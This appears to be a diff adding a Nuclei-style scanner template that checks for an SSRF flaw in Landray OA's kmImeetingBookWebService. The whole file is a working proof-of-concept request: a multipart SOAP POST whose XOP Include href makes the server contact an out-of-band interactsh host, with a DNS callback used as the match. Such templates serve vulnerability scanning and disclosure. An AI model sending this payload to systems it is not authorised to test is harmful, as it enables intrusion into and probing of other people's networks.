@@ -1,0 +1,34 @@
+id: poc-yaml-landray-kmimeetingbookwebservice-ssrf
+info:
+  name: Landray OA kmImeetingBookWebService SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+http:
+  - raw:
+      - |
+        POST /sys/webservice/kmImeetingBookWebService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getImeetingBookLists>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{interactsh-url}}"/></count>
+                </arg0>
+            </web:getImeetingBookLists>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
